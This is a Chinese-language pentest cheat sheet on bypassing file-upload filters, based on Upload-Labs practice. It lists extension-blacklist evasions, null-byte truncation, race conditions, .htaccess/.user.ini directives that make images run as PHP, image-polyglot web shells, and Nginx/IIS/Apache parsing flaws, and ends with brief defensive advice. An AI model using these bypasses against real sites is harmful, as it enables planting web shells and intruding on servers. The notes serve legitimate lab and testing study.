# 04 · 文件上传绕过手册

> Upload-Labs + 实战总结，按「客户端 → 服务端 → 环境」三层整理。

## 1. 客户端层

- 前端 JS 白名单 → 抓包改包即可，或禁用 JS

## 2. 服务端层

### 2.1 黑名单扩展名

| 场景 | 绕过 |
|---|---|
| 拦 `php` | `php3/php4/php5/php7/phtml/pht/phps` |
| 大小写检测 | `shell.PhP`（Windows 不区分大小写） |
| 删除 `.php`（一次） | `shell.pphphp` → 删中间剩 `shell.php` |
| 尾部点/空格 | `shell.php.` / `shell.php `（Windows 特性去掉） |
| `::$DATA`（Windows） | `shell.php::$DATA` |
| 双写/嵌套 | 结合具体过滤函数看 |

### 2.2 白名单

- `00 截断`：PHP < 5.3.4 + `magic_quotes_gpc=off`，GET 传 `%00`
- 条件竞争：服务端「先保存后检测删除」，高并发竞速访问
- `.htaccess` / `.user.ini` 间接执行：
  ```
  # .htaccess
  AddType application/x-httpd-php .jpg
  # .user.ini (FastCGI, 当前目录及子目录生效)
  auto_prepend_file=shell.jpg
  ```

### 2.3 内容检测

- 文件头：加 `GIF89a` 或真图片头拼接图片马
  ```bash
  cat pic.png shell.php > shell.png
  ```
- `getimagesize` → 图片马；`imagecreatefrom*` 二次渲染 → 找渲染后**不变的区域**（GIF 注释块最稳，JPEG 需避开压缩块）

## 3. 环境层

| 环境 | 关键点 |
|---|---|
| Nginx 解析漏洞 | `/shell.jpg/.php`（cgi.fix_pathinfo=1）、`%00` 截断老版本 |
| IIS 6 | `shell.asp;jpg`、目录 `/x.asp/1.jpg` 解析为 ASP |
| IIS 7.x | 同 Nginx pathinfo 漏洞 |
| Apache | 多扩展名从右往左识别，`shell.php.abc`（abc 不认识时向左） |
| Windows | 流文件 `shell.php::$DATA`、尾点尾空格 |

## 4. 拿到路径才能打

- 响应回显 / 报错信息 / 目录爆破 / 时间戳+随机数规则猜测
- 上传后立刻验证解析：访问返回 200 且执行即成功

## 5. 防守要点

- 白名单 + 随机文件名重命名
- 上传目录禁执行（Nginx `location ~* ^/uploads/ { deny all; }` 或不放 Web 容器）
- 图片二次处理（缩略图重编码）可破坏大部分马
- CDN/OSS 分离存储
